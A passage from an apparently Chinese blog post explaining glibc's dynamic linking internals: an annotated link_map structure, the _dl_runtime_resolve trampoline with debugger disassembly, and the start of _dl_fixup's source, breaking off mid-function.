ElfW(Addr) l_addr;  <span class="comment">/* ELF文件中的地址与内存中的地址之间的不同。共享文件加载基地址。 */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;       <span class="comment">/* 绝对文件名 */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;    <span class="comment">/* 共享对象的动态段  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span>  <span class="comment">/* 加载的共享对象链表指针 */</span></span><br><span class="line">    <span class="comment">/* 以下所有成员都是动态链接器的内部组件，可能随时改变不受提醒 */</span></span><br><span class="line">    <span class="comment">/* 当在多个名称空间中使用ld.so时，该元素与指向该类型的相同副本的指针不同。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    <span class="comment">/* 该link map所属的命名空间个数 */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* 指向“.dynamic”段的索引指针。</span></span><br><span class="line"><span class="comment">    这个数组用于快速访问动态段的信息，在lookup系列函数中会频繁使用。</span></span><br><span class="line"><span class="comment">    它的有关定义还包含了一系列用于访问信息的功能宏。 */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                    + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;  <span class="comment">/* 指向程序头表的指针。 */</span></span><br><span class="line">    ElfW(Addr) l_entry;        <span class="comment">/* 入口点位置。 */</span></span><br><span class="line">    ElfW(Half) l_phnum;        <span class="comment">/* 程序头条目的数量。 */</span></span><br><span class="line">    ElfW(Half) l_ldnum;        <span class="comment">/* dynamic段条目数量 */</span></span><br><span class="line">    <span class="comment">/* DT_NEEDED依存项及其依存项的数组，按依赖关系查找符号（包含和不包含重复项）。 在加载依赖项之前，没有任何条目。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* 我们需要一个特殊的搜索列表来处理标记有DT_SYMBOLIC的对象。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* 第一次导致该对象被加载的对象。  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line">    <span class="comment">/* 版本名称的数组。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line">    <span class="comment">/* 符号Hash表 */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* dlopen/dlclose的引用计数。  */</span></span><br><span class="line">    <span class="keyword">enum</span> &#123;                    <span class="comment">/* 该对象来自何处。 */</span></span><br><span class="line">        lt_executable,        <span class="comment">/* 主要的可执行程序。 */</span></span><br><span class="line">        lt_library,           <span class="comment">/* 主可执行文件需要的库。 */</span></span><br><span class="line">        lt_loaded             <span class="comment">/* 额外的运行时加载的共享库。 */</span></span><br><span class="line">    &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;      <span class="comment">/* 如果对象的重定位完成，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>;    <span class="comment">/* 如果DT_INIT函数被调用，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;         <span class="comment">/* 如果对象在_dl_global_scope中，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;       <span class="comment">/* 保留供内部使用。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* 如果分配了由“ l_phdr”指向的数据结构，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>;   <span class="comment">/* 如果确定SO_NAME在l_libname列表中，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;          <span class="comment">/* 如果这是一个没有关联文件的伪造描述符，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>;  <span class="comment">/* 重定位完成后，如果在此link map上调用GL（dl_init_static_tls），则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;       <span class="comment">/* 如果DSO用于审计，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>;  <span class="comment">/* 如果至少一个审计模块对PLT拦截感兴趣，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;        <span class="comment">/* 如果该对象已被删除而无法再使用，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>;     <span class="comment">/* 如果段间孔受到保护，或者根本不存在孔，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* 如果LD_TRACE_PRELINKING = 1期间的</span></span><br><span class="line"><span class="comment">                                                l_local_scope包含任何DT_SYMBOLIC库，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* 如果可以释放l_initfini，则为非零值。即，没有在ld.so中与虚拟malloc一起分配。 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 收集有关自己的RPATH目录的信息。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line">    <span class="comment">/* 概要分析时收集的重定位结果。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span> &#123;</span></span><br><span class="line">        DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">        <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">        <span class="comment">/* 并发性注：这用于保护跨多个线程的重定位结果的并发初始化。 请参阅elf/dl-runtime.c中的更详细说明。 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> init;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line">    <span class="comment">/* 指向版本信息的指针（如果有）。 */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line">    <span class="comment">/* 字符串，指定找到此对象的路径。 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line">    <span class="comment">/* 此对象的内存映射的开始和结束。 l_map_start不必与l_addr相同。 */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* 映射的可执行部分的结尾。 */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line">    <span class="comment">/* “l_scope”的默认数组。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* 为“ l_scope”分配的数组大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* 这是一个定义此link map的查找范围的数组。最初最多有三个不同的范围列表。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line">    <span class="comment">/* 类似的数组，这次仅与本地范围有关。偶尔使用。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line">    <span class="comment">/* 保留此信息以检查共享对象是否与已加载的对象相同。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line">    <span class="comment">/* 收集有关自己的RUNPATH目录的信息。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line">    <span class="comment">/* 按init和fini调用的顺序列出对象。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line">    <span class="comment">/* 通过符号绑定引入的依赖项列表。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span> &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">    &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line">    <span class="comment">/* 如果使用DSO，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line">    <span class="comment">/* 各种标志字。 */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line">    <span class="comment">/* 暂时在dl_close中使用。 */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">        <span class="keyword">int</span> type_class;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line">    <span class="comment">/* 线程本地存储相关信息。 */</span></span><br><span class="line">    <span class="comment">/* 初始化映像的开始。 */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* 初始化映像的大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* TLS块的大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* TLS块的对齐要求。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* 第一个字节模块对齐方式的偏移量。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET        0</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">"FORCED_DYNAMIC_TLS_OFFSET is not defined"</span></span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 对于启动时出现的对象：静态TLS块中的偏移量。 */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* dtv数组中模块的索引。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line">    <span class="comment">/* 此DSO构造的thread_local对象的数量。 这是原子访问和修改的，</span></span><br><span class="line"><span class="comment">    并不总是受加载锁保护。 另请参见：cxa_thread_atexit_impl.c中的“注意事项”。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line">    <span class="comment">/* 重定位完成后用于更改权限的信息。 */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line">    <span class="comment">/* 审计信息。 该数组显然必须是结构体中的最后一个。 切勿在其后添加任何内容。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> &#123;</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> cookie;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> bindflags;</span><br><span class="line">    &#125; l_audit[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="3-2-1、-dl-runtime-resolve-的内容"><a href="#3-2-1、-dl-runtime-resolve-的内容" class="headerlink" title="3.2.1、_dl_runtime_resolve()的内容"></a>3.2.1、_dl_runtime_resolve()的内容</h4><p>&emsp;&emsp;<strong><code>_dl_runtime_resolve()</code></strong>在<code>glibc-2.23/sysdeps/i386/dl-trampoline.S(64位把i386改为x86_64)</code>中使用<code>汇编</code>实现，其主要代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.globl</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.type</span> _dl_runtime_resolve, @function</span><br><span class="line">    cfi_startproc</span><br><span class="line"><span class="meta">.align</span> <span class="number">16</span></span><br><span class="line"><span class="symbol">_dl_runtime_resolve:</span></span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">    _CET_ENDBR</span><br><span class="line">    pushl %eax  # Preserve registers otherwise clobbered.</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    pushl %ecx</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    pushl %edx</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    movl <span class="number">16</span>(%esp), %edx  # Copy args pushed by PLT <span class="keyword">in</span> register.  Note</span><br><span class="line">    movl <span class="number">12</span>(%esp), %eax  # that <span class="string">'fixup'</span> takes its parameters <span class="keyword">in</span> regs.</span><br><span class="line">    <span class="keyword">call</span> _dl_fixup       # <span class="keyword">Call</span> resolver.</span><br><span class="line">    popl %edx            # Get register content back.</span><br><span class="line">    cfi_adjust_cfa_offset (-<span class="number">4</span>)</span><br><span class="line">    movl (%esp), %ecx</span><br><span class="line">    movl %eax, (%esp)    # Store the function address.</span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">    <span class="keyword">ret</span> <span class="number">$12</span>              # Jump to function address.</span><br><span class="line">    cfi_endproc</span><br><span class="line"><span class="meta">.size</span> _dl_runtime_resolve, .-_dl_runtime_resolve</span><br></pre></td></tr></table></figure></p><p><code>修正后</code>的代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line"><span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     <span class="keyword">push</span>   <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     <span class="keyword">push</span>   <span class="built_in">edx</span></span><br><span class="line"><span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0x10</span>]</span><br><span class="line"><span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0xc</span>]</span><br><span class="line">► <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;  <span class="keyword">call</span>   _dl_fixup &lt;<span class="number">0xf7fe77e0</span>&gt;</span><br><span class="line">     arg[<span class="number">0</span>]: <span class="number">0xc</span></span><br><span class="line">     arg[<span class="number">1</span>]: <span class="number">0x8048670</span> ◂— <span class="keyword">imul</span>   <span class="built_in">ebp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span> + <span class="number">0x70</span>], <span class="number">0x6e207475</span> /* <span class="string">'input name:'</span> */</span><br><span class="line"></span><br><span class="line"><span class="number">0xf7fee010</span> &lt;_dl_runtime_resolve+<span class="number">16</span>&gt;    <span class="keyword">pop</span>    <span class="built_in">edx</span></span><br><span class="line"><span class="number">0xf7fee011</span> &lt;_dl_runtime_resolve+<span class="number">17</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>]</span><br><span class="line"><span class="number">0xf7fee014</span> &lt;_dl_runtime_resolve+<span class="number">20</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0xf7fee017</span> &lt;_dl_runtime_resolve+<span class="number">23</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">4</span>]</span><br><span class="line"><span class="number">0xf7fee01b</span> &lt;_dl_runtime_resolve+<span class="number">27</span>&gt;    <span class="keyword">ret</span>    <span class="number">0xc</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;其采用了<code>GNU风格</code>的语法，<code>可读性</code>比较差。我们可以看到函数<code>_dl_runtime_resolve()</code>调用了<strong><code>_dl_fixup(link_map，reloc_arg)</code></strong>，后续操作都是在这个函数中完成的。</p><h4 id="3-2-2、-dl-fixup-的内容"><a href="#3-2-2、-dl-fixup-的内容" class="headerlink" title="3.2.2、_dl_fixup()的内容"></a>3.2.2、_dl_fixup()的内容</h4><p><code>_dl_fixup()</code>的实现位于<strong><code>glibc/elf/dl-runtime.c</code></strong>，其内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* elf_machine_type_class()返回的重定位类型类。 </span></span><br><span class="line"><span class="comment">   ELF_RTYPE_CLASS_PLT表示此重定位不应由某些PLT符号满足，</span></span><br><span class="line"><span class="comment">   ELF_RTYPE_CLASS_COPY意味着此重定位不应由可执行文件中的任何符号满足。 </span></span><br><span class="line"><span class="comment">   某些体系结构不支持copy重定位(引用外部变量)。 在这种情况下，我们将宏定义为零，以便自</span></span><br><span class="line"><span class="comment">   动优化处理它们的代码。 ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA表示</span></span><br><span class="line"><span class="comment">   共享库中定义的受保护数据的地址可能是外部的，即由于copy重定位。 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_RTYPE_CLASS_PLT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DL_NO_COPY_RELOCS</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> ELF_RTYPE_CLASS_COPY 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> ELF_RTYPE_CLASS_COPY 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第一次调用每个PLT条目时，将通过PLT的特殊跳转调用此功能。 我们必须执行给定共享对象的PLT中指定的重定位，并将已解析的函数地址返回到跳转，这将重新启动对该地址的原始调用。 将来的调用将直接从PLT跳转到该功能。 */</span></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           <span class="comment">//l为共享库或可执行文件ID，link_map结构指针。link_map结构链表第一个结点表示的是可执行文件。</span></span><br><span class="line">           <span class="comment">//reloc_arg为所解析函数的重定位项在重定位表.rel.plt中的偏移</span></span><br><span class="line">           struct link_map *l, ElfW(Word) reloc_arg)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//D_PTR是一个宏定义，位于glibc/sysdeps/generic/ldsodefs.h中，用于通过link_map结构体寻址。</span></span><br><span class="line">    <span class="comment">//通过link_map结构获取动态链接符号表.dynsym的地址</span></span><br><span class="line">    <span class="comment">//ELFW宏用来拼接字符串，在这里实际上是为了自动兼容32和64位,Elf32_Sym或Elf64_Sym</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//通过link_map结构获取动态链接字符串表.dynstr的地址</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]); </span><br><span class="line">    <span class="comment">//通过link_map结构获取重定位表.rel.plt中所求函数的重定位项的地址</span></span><br><span class="line">    <span class="comment">//reloc_offset为所解析函数的重定位项在重定位表.rel.plt中的偏移</span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); </span><br><span class="line">    <span class="comment">//求出所求函数在动态链接符号表.dynsym中对应符号项的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">    <span class="comment">//l_addr是共享库或可执行文件加载基址，rel_addr是重定位需要修改内容的地址，也就是.got.plt中所求函数对应项</span></span><br><span class="line">    <span class="comment">//r_offset为相对虚拟地址，rel_addr为虚拟地址</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">lookup_t</span> result;    <span class="comment">//查找函数的结果，其为定义函数的共享对象的加载基地址</span></span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  <span class="comment">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 安全性检查，我们需要确定它是一个PLT的重定位项 */</span></span><br><span class="line">    assert 